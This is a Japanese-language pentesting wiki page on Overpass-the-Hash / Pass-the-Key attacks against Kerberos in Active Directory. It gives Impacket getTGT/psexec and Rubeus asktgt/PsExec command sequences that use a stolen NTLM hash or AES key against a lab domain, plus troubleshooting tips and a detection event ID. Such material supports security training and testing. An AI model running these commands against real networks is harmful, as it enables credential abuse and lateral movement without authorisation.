# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** 攻撃は、従来の NTLM プロトコルが制限され、Kerberos 認証が優先される環境向けに設計されています。この攻撃は、ユーザーの NTLM ハッシュまたは AES キーを利用して Kerberos チケットを要求し、ネットワーク内のリソースへの不正アクセスを可能にします。

この攻撃を実行するための最初のステップは、ターゲットユーザーのアカウントの NTLM ハッシュまたはパスワードを取得することです。この情報を確保した後、アカウントのためのチケット付与チケット (TGT) を取得でき、攻撃者はユーザーが権限を持つサービスやマシンにアクセスできます。

プロセスは以下のコマンドで開始できます:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256が必要なシナリオでは、`-aesKey [AES key]`オプションを利用できます。さらに、取得したチケットはsmbexec.pyやwmiexec.pyなどのさまざまなツールで使用でき、攻撃の範囲を広げます。

_PyAsn1Error_や_KDC cannot find the name_のような問題は、通常、Impacketライブラリを更新するか、IPアドレスの代わりにホスト名を使用することで解決され、Kerberos KDCとの互換性が確保されます。

Rubeus.exeを使用した別のコマンドシーケンスは、この技術の別の側面を示しています：
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
この方法は**Pass the Key**アプローチを反映しており、認証目的でチケットを直接操作し利用することに焦点を当てています。TGTリクエストの開始は、イベント`4768: A Kerberos authentication ticket (TGT) was requested`をトリガーし、デフォルトでRC4-HMACの使用を示しますが、最新のWindowsシステムはAES256を好みます。

運用セキュリティに準拠し、AES256を使用するには、次のコマンドを適用できます：
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 参考文献

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)


{{#include ../../banners/hacktricks-training.md}}
